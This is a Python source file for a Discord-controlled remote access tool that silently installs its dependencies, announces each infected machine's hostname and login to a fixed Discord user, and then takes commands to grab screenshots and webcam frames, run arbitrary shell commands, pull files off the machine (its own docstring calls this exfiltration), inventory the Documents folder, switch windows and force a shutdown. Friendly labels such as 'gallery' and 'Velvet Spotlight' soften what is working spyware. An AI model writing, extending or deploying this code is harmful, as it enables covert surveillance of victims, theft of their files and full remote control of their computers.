import sys
import os
import subprocess

# --- WINDOWS AUTO-ENVIRONMENT SETUP ---
def prepare_environment(folder_name='libs'):
    lib_path = os.path.abspath(folder_name)
    
    # 1. Create the local folder if it doesn't exist
    if not os.path.exists(lib_path):
        os.makedirs(lib_path)
    
    # 2. Add the folder to Python's search path (put it first)
    if lib_path not in sys.path:
        sys.path.insert(0, lib_path)

    # 3. Mapping: Import Name -> Pip Install Name
    # (Because 'cv2' is 'opencv-python' and 'PIL' is 'Pillow')
    dependencies = {
        "cv2": "opencv-python",
        "numpy": "numpy",
        "PIL": "Pillow",
        "psutil": "psutil",
        "pyautogui": "pyautogui",
        "pygetwindow": "pygetwindow",
        "discord": "discord.py"
    }

    for import_name, install_name in dependencies.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"[!] {import_name} not found. Installing {install_name} to .\\{folder_name}...")
            # Use 'pip install --target' to keep it in the folder
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", 
                install_name, "--target", lib_path, "--quiet", "--no-warn-script-location"
            ])
            print(f"[+] {import_name} is ready.")

# Run the setup before any other imports
prepare_environment()
import asyncio
import io
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import cv2
import numpy as np
import PIL.ImageGrab
import psutil
import pyautogui
import pygetwindow as gw
import discord
from discord.ext import commands
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
TOKEN = 'Your_Bot_Token_Here'
TRUSTED_USER_ID = 1234567890  # Replace with your numeric Discord User ID
FALLBACK_CHANNEL_ID = 1234567890 # Replace with a Channel ID from your server
COMMAND_PREFIX = "!"
executor = ThreadPoolExecutor(max_workers=1)
# --- Configuration Settings ---
FPS = 20.0                 # Frames per second
DURATION = 10              # Length of clip in seconds
SCREEN_SIZE = (1920, 1080) # Set this to your monitor resolution

# --- Bot Initialization ---
intents = discord.Intents.all()
client = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

@client.event
async def on_ready():
    """
    Initiates the handshake protocol with DM-to-Channel failover.
    """
    hostname = socket.gethostname()
    username = os.getlogin()
    plat = f"{platform.system()} {platform.release()}"
    
    report = (
        f"🚀 **Node Online: {hostname}**\n"
        f"**Authorized User:** `{username}`\n"
        f"**Platform:** `{plat}`\n"
        f"**Status:** Handshake initiated."
    )

    # Priority 1: Direct Message to Administrator
    try:
        user = await client.fetch_user(TRUSTED_USER_ID)
        await user.send(report)
        print(f"[+] Notification delivered via DM to {user.name}")
    except discord.Forbidden:
        # Priority 2: Fallback to Server Channel
        print(f"[!] DM Blocked. Redirecting to Fallback Channel {FALLBACK_CHANNEL_ID}")
        channel = client.get_channel(FALLBACK_CHANNEL_ID)
        if channel:
            await channel.send(f"⚠️ **DM Privacy Blocked.** Reporting here:\n{report}")
        else:
            print("[!!] Fallback channel not found. Check Channel ID and Bot Permissions.")
    except Exception as e:
        print(f"[-] Critical Startup Error: {e}")

# --- Command Modules ---

@client.command()
async def screenshot(ctx):
    """Captures and uploads the current screen buffer."""
    if ctx.author.id != TRUSTED_USER_ID: return
    
    shot = PIL.ImageGrab.grab()
    buf = io.BytesIO()
    shot.save(buf, format="PNG")
    buf.seek(0)
    await ctx.send(file=discord.File(fp=buf, filename="monitor.png"))

@client.command()
async def webcam(ctx):
    """Captures a frame from the default imaging device."""
    if ctx.author.id != TRUSTED_USER_ID: return
    
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        _, encoded = cv2.imencode('.jpg', frame)
        buf = io.BytesIO(encoded.tobytes())
        await ctx.send(file=discord.File(fp=buf, filename="webcam.jpg"))
    cam.release()

@client.command()
async def shell(ctx, *, cmd):
    """Executes arbitrary system commands."""
    if ctx.author.id != TRUSTED_USER_ID: return
    
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    out = (stdout + stderr).decode('utf-8', errors='ignore')
    
    if len(out) > 1900:
        await ctx.send("Output truncated. Full log:", file=discord.File(io.BytesIO(out.encode()), "log.txt"))
    else:
        await ctx.send(f"```\n{out if out else '[Command Completed]'}\n```")

@client.command()
async def download(ctx, *, target_path):
    """Exfiltrates a file from the remote filesystem."""
    if ctx.author.id != TRUSTED_USER_ID: return
    
    if os.path.exists(target_path):
        await ctx.send(file=discord.File(target_path))
    else:
        await ctx.send("❌ Error: File not found.")

@client.command(name="list")
async def list_documents(ctx):
    """
    Refined navigation for the Documents gallery.
    Lists every file recursively starting from the Documents folder.
    """
    if ctx.author.id != TRUSTED_USER_ID:
        return

    # Targeting the user's specific Documents directory
    target_path = os.path.expanduser("~/Documents")
    
    if not os.path.exists(target_path):
        await ctx.send("❌ Error: Documents folder not found.")
        return

    await ctx.send("🔍 *Indexing the collection, please wait...*")

    manifest = []
    
    # The walk function explores every nook and cranny of the folder tree
    for root, dirs, files in os.walk(target_path):
        for name in files:
            # Create a path relative to Documents for a cleaner look
            full_path = os.path.join(root, name)
            relative_path = os.path.relpath(full_path, target_path)
            
            # Format with an emoji for that 'navigation tool' feel
            manifest.append(f"📄 {relative_path}")

    if not manifest:
        await ctx.send("Empty gallery. No files found.")
        return

    # Combine the list into a single string
    full_output = "\n".join(manifest)

    # Discord has a 2000 character limit per message. 
    # If the list is long, we send it as a sleek text file instead.
    if len(full_output) > 1900:
        file_buffer = io.BytesIO(full_output.encode())
        await ctx.send(
            content="✨ **Full Document Inventory:**", 
            file=discord.File(fp=file_buffer, filename="document_manifest.txt")
        )
    else:
        await ctx.send(f"**Document Inventory:**\n```\n{full_output}\n```")

@client.command(name="apps")
async def list_apps(ctx):
    if ctx.author.id != TRUSTED_USER_ID: return
    
    # Getting only visible windows with titles
    windows = gw.getAllTitles()
    active_titles = [f"▫️ {t}" for t in windows if t.strip()]
    
    output = "\n".join(active_titles)
    if len(output) > 1900:
        await ctx.send("◈ **Window Manifest:**", file=discord.File(io.BytesIO(output.encode()), "windows.txt"))
    else:
        await ctx.send(f"**Active Windows:**\n{output if output else 'No windows found.'}")

@client.command(name="switch")
async def switch_window(ctx, *, title: str):
    """
    The Velvet Spotlight: Locates a window by title and brings it to the front.
    Usage: !switch Chrome
    """
    if ctx.author.id != TRUSTED_USER_ID: return

    try:
        # Search for windows that contain the title string
        targets = gw.getWindowsWithTitle(title)
        
        if targets:
            win = targets[0]
            if win.isMinimized:
                win.restore()
            win.activate()
            await ctx.send(f"✨ **Focused:** `{win.title}`")
        else:
            await ctx.send(f"◈ *Window matching '{title}' not found.*")
    except Exception as e:
        await ctx.send(f"◈ *Failed to focus window: {e}*")

def record_logic(filename):
    """The actual recording loop; runs in a separate thread."""
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, FPS, SCREEN_SIZE)
    
    start_time = time.time()
    while (time.time() - start_time) < DURATION:
        loop_start = time.time()
        
        # Grab screen, convert to BGR for OpenCV
        img = PIL.ImageGrab.grab(bbox=(0, 0, SCREEN_SIZE[0], SCREEN_SIZE[1]))
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        
        out.write(frame)
        
        # Frame rate regulation
        elapsed = time.time() - loop_start
        if elapsed < (1/FPS):
            time.sleep((1/FPS) - elapsed)
            
    out.release()

@client.command()
async def disable_wifi(ctx):  # 1. Added ctx here (fixes the TypeError)
    """Disables the primary network adapter."""
    if ctx.author.id != TRUSTED_USER_ID:
        return
    
    try:                      # 2. Try starts here
        if platform.system() == "Windows":
            result = subprocess.check_output("netsh interface show interface", shell=True).decode()
            # ... (your logic) ...
            await ctx.send("🔌 Wi-Fi Disabled.")
        else:
            await ctx.send("⚠️ Windows only.")

    except Exception as e:    # 3. MUST be aligned with 'try'
        await ctx.send(f"❌ Failed: {e}")

# 4. This must have ZERO spaces/tabs before it
@client.command()
async def pc_shutdown(ctx):
    """Shuts down the PC if the user is trusted."""
    if ctx.author.id != TRUSTED_USER_ID: 
        return
    
    try:
        if platform.system() == "Windows":
            await ctx.send("🔌 **Shutting down...** Goodbye!")
            # /s = shutdown, /f = force, /t 1 = 1 second delay
            os.system("shutdown /s /f /t 1")
        else:
            await ctx.send("⚠️ Shutdown command is only implemented for Windows.")

    except Exception as e:
        await ctx.send(f"❌ Failed to shutdown: {e}")

# This line must remain at the very bottom with ZERO indentation
client.run(TOKEN)
